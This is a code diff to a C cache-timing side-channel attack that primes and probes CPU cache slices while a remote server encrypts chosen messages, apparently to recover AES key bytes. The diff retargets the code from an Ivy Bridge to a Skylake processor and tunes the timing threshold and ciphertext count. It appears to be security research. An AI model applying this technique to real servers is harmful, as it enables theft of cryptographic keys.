@@ -9,9 +9,9 @@
 
 #include <math.h>
 
-#define EMPIRICAL_CACHE_ACCESS_TIME 700 //1000
+#define EMPIRICAL_CACHE_ACCESS_TIME 600 //1000
 #define REPS 1
-#define CIPHERTEXTS 100000 //20000000
+#define CIPHERTEXTS 20000000	//100000	//
 
 unsigned long int possible_key_space(int X[16][256]);
 
@@ -33,7 +33,7 @@ int main(int argc, char* argv[])
     volatile char *F = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
     F[2048] = 0xAA;
 
-    if (!ivybridge_i7_3770_setup(0x1d667da80)) {      //0x119c00000
+    if (!skylake_i7_6700_setup(0x1d667da80)) {      //0x119c00000
         printf("[x] Not enough memory could be allocated on required cache-slice, please try again and/or increase hugepages available memory");
         return 0;
     }
@@ -83,14 +83,14 @@ int main(int argc, char* argv[])
             //Connect to remote server
             if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");
 
-            ivybridge_i7_3770_prime(); //return 0;
-            ivybridge_i7_3770_reprime();
+            skylake_i7_6700_prime(); //return 0;
+            skylake_i7_6700_reprime();
 
             if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
             if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }
 
             //x += F[0];
-            prob_time = ivybridge_i7_3770_probe(); //printf("%lu\n", prob_time); //return 0;
+            prob_time = skylake_i7_6700_probe(); //printf("%lu\n", prob_time); //return 0;
 
             //if (prob_time < EMPIRICAL_CACHE_ACCESS_TIME) 
             //    printf("prob_time\t:\t%d\n", prob_time);
